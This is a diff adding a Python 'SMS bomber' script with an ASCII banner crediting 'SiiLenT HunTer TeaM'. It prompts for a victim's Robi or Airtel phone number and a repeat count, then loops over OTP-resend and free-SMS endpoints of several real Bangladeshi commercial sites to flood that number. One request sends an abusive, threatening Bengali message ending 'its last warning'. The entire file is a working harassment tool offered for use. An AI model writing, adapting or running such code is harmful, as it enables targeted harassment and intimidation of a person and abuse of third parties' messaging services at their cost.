@@ -1,0 +1,115 @@
+import requests
+from requests.structures import CaseInsensitiveDict
+
+green = '\033[1;32m'
+end = '\033[0m'
+print (green+"""  _ _______ _                                                    
+ (_)__   __( )                                                   
+  _   | |  |/ ____                                               
+ | |  | |    |_  /                                               
+ | |  | |     / /                                                
+ |_|_ |_|____/___|_             _______                          
+  / /  / ____(_|_) |           |__   __|                         
+ | |  | (___  _ _| |     ___ _ __ | |                            
+ | |   \___ \| | | |    / _ \ '_ \| |                            
+ | |   ____) | | | |___|  __/ | | | |                            
+ | |  |_____/|_|_|______\___|_| |_|_|                            
+  \_\  _          _______                                        
+ | |  | |        |__   __|                                       
+ | |__| |_   _ _ __ | | ___ _ __                                 
+ |  __  | | | | '_ \| |/ _ \ '__|                                
+ | |  | | |_| | | | | |  __/ |                                   
+ |_|__|_|\__,_|_| |_|_|\___|_|                                   
+ |__   __|       |  \/  | \ \                                    
+    | | ___  __ _| \  / |  | |                                   
+    | |/ _ \/ _` | |\/| |  | |                                   
+    | |  __/ (_| | |  | |  | |                                   
+    |_|\___|\__,_|_|  |_|  | |                                   
+   _____             _____/_/                                    
+  / ____|           |__   __|                                    
+ | |     _ __ ___  __ _| | ___  _ __                             
+ | |    | '__/ _ \/ _` | |/ _ \| '__|                            
+ | |____| | |  __/ (_| | | (_) | |                               
+  \_____|_|  \___|\__,_|_|\___/|_|                               
+  |  _ \                                                         
+  | |_) |_   _                                                   
+  |  _ <| | | |                                                  
+  | |_) | |_| |                                                  
+  |____/ \__, |                                                  
+          __/ |                                                  
+   __  _ |___/_____         _____ _    _       _  ___ ____   __  
+  / / | |  | |  __ \       / ____| |  | |     | |/ (_)  _ \  \ \ 
+ | |  | |__| | |  | |_____| (___ | |__| | __ _| ' / _| |_) |  | |
+ | |  |  __  | |  | |______\___ \|  __  |/ _` |  < | |  _ <   | |
+ | |  | |  | | |__| |      ____) | |  | | (_| | . \| | |_) |  | |
+ | |  |_|  |_|_____/      |_____/|_|  |_|\__,_|_|\_\_|____/   | |
+  \_\_                                                       /_/ 
+  ( _ )                                                          
+  / _ \/\                                                        
+ | (_>  <                                                        
+  \___/\/   _ _____             _  ____    __     __ __          
+  / / | |  | |  __ \           | |/ __ \   \ \   / / \ \         
+ | |  | |__| | |  | |______    | | |  | |_ _\ \_/ /   | |        
+ | |  |  __  | |  | |______|   | | |  | | '_ \   /    | |        
+ | |  | |  | | |__| |     | |__| | |__| | | | | |     | |        
+ | |  |_|  |_|_____/       \____/ \____/|_| |_|_|     | |        
+  \_\                                                /_/         
+                                                                 """+end)
+
+# CVALUE
+blue = '\33[94m'
+lightblue = '\033[94m'
+red = '\033[91m'
+white = '\33[97m'
+yellow = '\33[93m'
+green = '\033[1;32m'
+cyan = "\033[96m"
+end = '\033[0m'
+print ("\033[32m")
+
+print ("	 -!-!- WeLcOmE-!-!- (SiiLenT HunTer TeaM ) ")
+
+
+number  = str(input("       [>] EnTer yOur aTTack RoBi/AirTeL NumBer: "))
+
+amount = int(input("        [>] CHoiCe YOur PiiN AmOunT : "))
+
+url1 = "http://128.199.215.102/api/otpresend"
+
+headers1 = CaseInsensitiveDict()
+headers1["Content-Type"] = "application/x-www-form-urlencoded"
+
+data1 = "phone="+number
+
+
+url2 = "https://www.fairmart.com.bd:443/api/user/send-otp"
+
+headers2 = CaseInsensitiveDict()
+headers2["Content-Type"] = "application/x-www-form-urlencoded"
+
+data2 = "mobile="+number
+
+url3 = "http://crux.bongobd.com:80/api/SMS/SendFreeSMS?msisdn=88"+number+"&sms=MeyEDer Ke HuDaii PiN MaRa TurE kuN kHanKir POLa SikHaiCE?  VaLoii vaLoii khOMa CheyE Ne. NaiiLe PorE PaLaBi jE LunGi Porar SoMOy O paBiNa. iTs LasT WarNinG&sc=16443"
+
+url4 = "https://aleshacard.com/api/register-otp?contact_no="+number
+
+url5 = "https://api.meenaclick.com/api/front/sms/send/pin?'"
+
+headers5 = CaseInsensitiveDict()
+headers5["Content-Type"] = "application/x-www-form-urlencoded"
+
+data5 = "cell_phone="+number
+
+for i in range(amount):
+	
+	resp1 = requests.post(url1, headers=headers1, data=data1)
+	
+	resp2 = requests.post(url2, headers=headers2, data=data2)
+
+	resp3 = requests.get(url3)
+
+	resp4 = requests.get(url4)
+	
+	resp5 = requests.post(url5, headers=headers5, data=data5)
+	
+	print(str(i+1)+" SMS Sent")
